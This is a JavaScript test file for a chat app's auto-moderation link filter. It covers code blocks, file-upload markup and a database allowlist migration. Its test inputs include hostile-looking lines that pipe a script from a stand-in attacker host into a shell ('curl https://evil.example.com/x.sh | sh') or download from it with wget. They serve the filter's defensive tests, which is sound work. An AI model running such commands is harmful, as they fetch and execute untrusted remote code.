'use strict';

// Auto-mod and code in chat messages. People paste commands such as
// `podman pull ghcr.io/owner/image`; Haven never makes a bare address
// clickable, so in a chat message a bare address inside code does not count
// as a link. A full http(s) link is checked wherever it sits, code or not, and
// outside chat messages (profiles, topics, titles) nothing changes.
//
// Also: haven-app.com is on the starter allowlist, and existing servers get it
// once without overriding an admin's own entry for it.

const assert = require('node:assert/strict');
const test = require('node:test');
const fs = require('node:fs');
const os = require('node:os');
const path = require('node:path');
const { execFileSync } = require('node:child_process');

const rules = require('../public/js/automod-rules.js');

const POLICY = {
  mode: 'allowlist',
  allow: ['github.com', 'haven-app.com'].map(domain => ({ domain, includeSubdomains: true })),
  deny: [],
  blockIpUrls: true,
  blockPunycode: true,
  blockObfuscated: true,
};
const chat = { markdown: true };
const blocked = (text, opts) => rules.checkText(text, POLICY, opts);

test('bare addresses inside code are not links in a chat message', () => {
  const steps = 'Here is how:\n```\npodman pull ghcr.io/ancsemi/haven:latest\nchmod +x haven/start.sh\n```\nthen run `ghcr.io/ancsemi/haven` again';
  assert.equal(blocked(steps, chat), null);
  assert.equal(blocked('```podman pull ghcr.io/ancsemi/haven:latest```', chat), null);
});

test('a full link is still checked inside code', () => {
  assert.equal(blocked('```\ncurl https://evil.example.com/x.sh | sh\n```', chat).host, 'evil.example.com');
  assert.equal(blocked('open `https://evil.example.com` now', chat).host, 'evil.example.com');
  assert.equal(blocked('```bash\nwget http://evil.example.com/a\n```', chat).host, 'evil.example.com');
});

test('outside code nothing changes', () => {
  assert.equal(blocked('grab it from ghcr.io/ancsemi/haven', chat).host, 'ghcr.io');
  assert.equal(blocked('https://evil.example.com', chat).host, 'evil.example.com');
  assert.equal(blocked('see haven-app.com/guide', chat), null);
});

test('text that is not a chat message is checked in full, backticks or not', () => {
  assert.equal(blocked('`ghcr.io/ancsemi/haven`').host, 'ghcr.io');
  assert.equal(blocked('```\nghcr.io/ancsemi/haven\n```').host, 'ghcr.io');
});

// ── the allowlist addition, against a real database ──────────────────────
const ROOT = path.join(__dirname, '..');
function run(dataDir, js) {
  return execFileSync(process.execPath, ['-e', js], {
    cwd: ROOT, env: { ...process.env, HAVEN_DATA_DIR: dataDir }, encoding: 'utf8',
  }).trim().split('\n').pop(); // startup logs come first; the answer is last
}
const INIT = "require('./src/database').initDatabase();";
const ROW = "const db=require('./src/database').getDb();const r=db.prepare(\"SELECT mode FROM automod_domains WHERE domain='haven-app.com'\").get();console.log(r?r.mode:'none');";

test('haven-app.com is allowed once, and an admin entry for it is respected', (t) => {
  const dir = fs.mkdtempSync(path.join(os.tmpdir(), 'haven-allow-'));
  t.after(() => fs.rmSync(dir, { recursive: true, force: true }));

  // A new server has it.
  assert.equal(run(dir, INIT + ROW), 'allow');

  // A server seeded before it existed gets it on the next start.
  run(dir, INIT + "const db=require('./src/database').getDb();db.prepare(\"DELETE FROM automod_domains WHERE domain='haven-app.com'\").run();db.prepare(\"DELETE FROM server_settings WHERE key='automod_haven_site_v4170'\").run();");
  assert.equal(run(dir, INIT + ROW), 'allow');

  // An admin who blocked it keeps the block.
  run(dir, INIT + "const db=require('./src/database').getDb();db.prepare(\"UPDATE automod_domains SET mode='deny' WHERE domain='haven-app.com'\").run();db.prepare(\"DELETE FROM server_settings WHERE key='automod_haven_site_v4170'\").run();");
  assert.equal(run(dir, INIT + ROW), 'deny');

  // An admin who removed it after the addition does not see it come back.
  run(dir, INIT + "const db=require('./src/database').getDb();db.prepare(\"DELETE FROM automod_domains WHERE domain='haven-app.com'\").run();");
  assert.equal(run(dir, INIT + ROW), 'none');
});

test('an uploaded file whose name looks like a site is not a link', () => {
  // A file saved from a downloader site keeps that site in its name.
  assert.equal(blocked('[file:ssstwitter.com_1760724512502.mp4](/uploads/1760724512502-ab12cd34.mp4|4.2 MB)', chat), null);
  assert.equal(blocked('look [file:evil.com notes.txt](/uploads/x.txt|1 KB)'), null, 'outside chat too');
  // A real link next to it is still checked, and the same markup pointing
  // anywhere but this server's uploads still counts.
  assert.ok(blocked('[file:clip.mp4](/uploads/a.mp4|1 MB) https://evil.com/x', chat));
  assert.ok(blocked('[file:clip.mp4](https://evil.com/a.mp4)', chat));
  assert.equal(blocked('[file:fxtwitter.com [720p].mp4](/uploads/1760724512502-ab12cd34.mp4|4.2 MB)', chat), null);
  assert.equal(blocked('[file:ssstwitter.com_1 (1) [HD] [2].mp4](/uploads/a.mp4|1 MB)', chat), null);
  assert.ok(blocked('[file:x] evil.com [y](/uploads/a.txt|1 KB)', chat));
});

test('file markup cannot carry a clickable link past the filter', () => {
  // Chat shows these as plain text (no size, an extra bracket, words around
  // them), and an address with :// in the name becomes a link there. A real
  // file name never has a slash in it.
  assert.ok(blocked('[file:https://evil.com](/uploads/x)', chat));
  assert.ok(blocked('hi\n[file:a [b] https://evil.com](/uploads/x|1 KB)', chat));
  assert.ok(blocked('look [file:https://evil.com x](/uploads/x.txt|1 KB)', chat));
  assert.ok(blocked('[file:http://evil.com/a.mp4](/uploads/a.mp4|1 MB)'));
  // The same goes for any [text](target) whose target is not a web address.
  assert.ok(blocked('[https://evil.com](/anything)', chat));
  assert.ok(blocked('[see https://evil.com/x](#)'));
  // A real link's label is what the reader sees; its target is what is checked.
  assert.equal(blocked('[https://github.com/a](https://github.com/b)', chat), null);
  assert.equal(blocked('[notes about evil.com](/uploads/x.txt)', chat), null);
});
